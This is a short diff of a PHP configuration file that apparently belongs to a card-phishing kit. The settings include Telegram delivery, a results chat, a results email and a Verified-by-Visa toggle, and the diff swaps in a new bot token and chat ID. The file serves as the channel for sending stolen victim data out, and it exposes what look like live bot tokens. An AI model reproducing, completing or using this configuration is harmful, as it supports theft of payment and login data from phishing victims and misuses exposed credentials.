@@ -6,8 +6,8 @@ $rezmail = "";
 
 # Telegram
 $tlg_send = true;
-$bot_token = "7055576803:AAHnFD3PAcinjw3pRvtHRfXbMy6NyyOeLek";
-$rez_chat = "-4965253584";
+$bot_token = "7712187103:AAFQ1w91I1F_6B8RlFRi81xcd0AEvVCT6t4";
+$rez_chat = "-4959694505";
 
 # VBV
 $vbv = false;
